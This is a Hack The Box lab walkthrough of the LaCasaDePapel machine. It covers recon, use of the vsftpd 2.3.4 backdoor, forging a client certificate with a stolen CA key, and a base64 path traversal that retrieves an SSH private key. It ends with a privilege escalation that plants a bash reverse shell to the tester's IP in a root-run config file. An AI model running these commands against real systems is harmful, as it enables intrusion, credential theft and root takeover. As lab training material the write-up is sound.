# LaCasaDePapel [HTB](https://app.hackthebox.com/machines/181)
![pepel-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/pepel-01.png)


## Recon

After adding the target to my `/etc/hosts` fie I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 lacasadepapel.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/ports-02.png)


From here I run a software and version detection scan agants the found ports:

```bash
nmap -p 21,22,80,443,6200 -sCV lacasadepapel.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/nmap-res-03.png)

We have the following:

+ An FTP server on port 21.
+ An SSH server on port 22.
+ A Node.js Express server on ports 80 & 443.
+ A filtered service of `lm-x` on port 6200.


The most interesting entry on the list is the Node.js server running both an HTTP & HTTPS instances, so let's have a look! 


## Node.js Express Port 80 


If we open the HTTP site at `http://lacasadepapel.htb/` we see the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/site-04.png)


This QR-code is for the Google Authenticator app, which is a common application used for 2FA. Scanning this QR-code results in a new `Token` entry in my authenticator app, which generates a 6-digit passcode, though I wasn't sure what to do with this code. I tired supplying it to the `one password` field, adding an arbitrary email and hiiting the `Get Free Trial` button, but it did nothing. 


I intercepted this transaction in my Burp proxy, trying to find interesting HTTP headers, and understand the logic of the application, but I found nothing of substance. I kept getting redirected to the main page no matter what I did. I also ran a directory and file scan which came out empty. 


At this point I decided to check the HTTPS site.


## Node.js Express Port 443


If we browse towards `https://lacasadepapel.htb/` we see the following:

![site-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/site-05.png)


The message says that we need a client certificate to get into this site. I did a bit of research and I found [this great artical](https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326) on medium which explains how HTTPS certificate based authentication works in Node.js applications. 


In short, we can generate our own client certificate and present it to the server. However, we need a CA to sign the certificate for us. Trying to self-sign our certificate is possible, and I tried it. But it was rejected by the server, and returned the same message. 


What's proably going on, is that the target server acts as it's own CA, and trusts only certificates who have been sign by himself. So in order to generate a valid certificate, we need to find the server's CA key. 


At this point I got a bit stuck, as I wasn't sure form where we can get the CA's key. So I decided to take a look at the other services running on this target.


## FTP Port 21

Based on the `nmap` scan, we know that the target is running a `vsftpd 2.3.4` server. If we search for pulic exploits for this server we can find [this backdoor RCE exploit](https://www.exploit-db.com/exploits/49757) from ExploitDB. 


The exploit seems to be using the `telnetlib` python module to open a connection to the FTP server on port 21 and authenticate to it. Then, the exploit opens another connection, this time to port 6200 and starts some sort of shell. 


From our `nmap` scan, our target had port `6200` falgged as filtered, so this makes this exploit very interesting. I decided to try it out manually. 


First, I opened a telnet connection to the FTP server and authenticated using the credentials from the exploit:

![telnet-ftp-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/telnet-ftp-06.png)


Then, I started another telnet connection to port 6200 and I get a Psy shell:

![telnet-shell-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/telnet-shell-07.png)


### Psy Shell

Based on the banner it looks like we are in some sort of a PHP shell, though it's not entirely clear how we should interact with this shell. 


So I start inputting some PHP functions and I get results:

![functions-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/functions-08.png)


But running system commands didn't work:

![no-exec-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/no-exec-09.png)


So instead, I decided to look around the filesystem. First, I start with the `/home` directory:

![users-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/users-10.png)


Looks like we have all of the members from the heist crew as users on the system. I start digging through each user's home directory. 


In `berlin`'s home directory, I can see the `.ssh` dir, and the `user.txt` flag. I try to read both objects but I get deined:

![denied-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/denied-11.png)


So I continue looking into the other user's home folders. When I get to `nairobi`, I see the `ca.key` I was looking for and I retrieve it:

![ca-key-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/ca-key-12.png)


After I copy and save the CA key to a file on my attack machine, I download the server certificate from my firefox browser. 


On the HTTPS site, I click on the lock icon, and then I click on the `connection is not secure` button which brings up this window:

![more-info-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/more-info-13.png)


I click on the `More Information` button which brings up a new window. In it, I select the `View Certificates` button:

![view-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/view-14.png)


This opens a new tab in my borwser. I scroll down until I see a link to download the certificate:

![cert-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/cert-15.png)


I download, and I move it to my working directory. Now we should have everything we need in order to generate a valid client certificate. 


First, I create an RSA key and a certificate signing request with the following command:

```bash
openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj "/CN=Alice"
```

Then, I use the `ca.key` file we exfiltrated from `nairobi`'s home directory to sign my certificate request:

```bash
openssl x509 -req -in alice_csr.pem -CA lacasadepapel-htb.pem -CAkey ca.key -out alice_cert.pem -set_serial 01 -days 365
```

The next step is to bundle our key and singed certificate to a PKC#12 format. This is necessary in order for firefox to be able to use it to. To achive this, we can use the following command:

```bash
openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12
```

It will ask you for a password in order to protect the certificate. After which you should have the final PKC#12 certificate in your working directory.


The final step is to import this certificate into firefox. For that, open the firefox settings tab and saerch for the term `cert`. Which should bring you the `View Certificates` button:

![view-certs-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/view-certs-16.png)


After clicking on this button, you should see the `Certificate Manager` window. Once there, click on the `Import` button and select the newly created `alice.p12` file. After supplying the password you chose, you should see the certificate has been successfully imported into your browser:

![imported-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/imported-17.png)


Click on `Ok`, and we should be good to go.


Now after we refresh the HTTPS site, we can see the authentication taking place:

![auth-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/auth-18.png)


I click on Ok, and I get to the private area:

![private-area-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/private-area-19.png)


### Private Area


Once inside, I click on Season-1, since it was the best season... And I get this page allowing me to download all the episodes:

![season-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/season-20.png)


But what's more interesting is the `path` parameter in the URL. This immediately gets my attention, and I start thinking about LFI. But before I start messing around with this, I want to intercept the tarffic in Burp suite. To do that, we need to import the PKC#12 certificate to Burp as well. You can follow along [these instruction](https://portswigger.net/burp/documentation/desktop/settings/network/tls) to do so.


Once I have my Burp set up, I intercept a request and send it to Repeater. At first, I start with the following request:

![initial-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/initial-21.png)


We can see the application is running from `berlin`'s home directory. The application is taking the argument from the `path` parameter and searches inside `/home/berlin/downloads`. However, we get an error from the `scandir` function, complaining that our input is not a directory. So we can't retrieve files directly using this parameter, we can only list the contents of directories. 


But There was an option to download episodes, so there must be a file inclusion function somewhere in the application. 


I try to download an episode while intercepting the traffic in Burp proxy and I see the following:

![file-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/file-22.png)


This looks like a base64 encoded string. Decoding it results in the following:

![decode-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/decode-23.png)


So in order to read `berlin`'s private SSH key we can run something like this:

```bash
curl -k https://lacasadepapel.htb/file/$(echo -n "../.ssh/id_rsa" | base64) > berlin_id_rsa
```

![key-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/key-24.png)


From here, I try to log in to the SSH as `berlin` but it prompts me for a password:

![prompt-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/prompt-25.png)


This means that the key authentication failed! Why? 


So I try to use the SSH key to login as other users. Eventually, I found that the key works to login as `professor`:

![professor-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/professor-26.png)


## Privilege Escalation


If we list the contents of `professor`'s home directory we can see the following config file:

![home-dir-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/home-dir-27.png)


The file reads as such:

![config-file-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/config-file-28.png)


We can see that `memcached.js`, which is is a general-purpose distributed memory-caching system ([source](https://en.wikipedia.org/wiki/Memcached)), is being executed as the `nobody` service account via `sudo`. 

This to me looks like a cronjob, and I wanted to see who might be running it. So I listed the running processes on the system using `ps auxww`. This didn't reveal the true user who is running the cronjob, but it reveal something else:

![ps-aux-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/ps-aux-29.png)


We can see that `root` is running whatever cronjobs might be in `/etc/crontabs`. And if we list this directory we can see only one directory belonging to `root`:

![crontabs-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/crontabs-30.png)


Therefore the cronjobs must be running as `root`. 


To exploit this, we need to overwrite the `memcached.ini` file, but it's owned by root and we don't have permissions to it. So what I did instead, was to rename the original file using the following command:

```bash
mv memcached.ini memcached.ini.bak
```


Effectively making a backup. Then, I created a new `memcached.ini` file as such:

```bash
echo '[program:memcached]' > memcached.ini
echo 'command = sudo /bin/bash -c "bash -i >& /dev/tcp/10.10.14.89/443 0>&1"' >> memcached.ini
```

Next I started my local listener using:

```bash
rlwrap nc -lnvp 443
```

And after a couple of seconds I receive the connection from `root`:

![root-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/root-31.png)
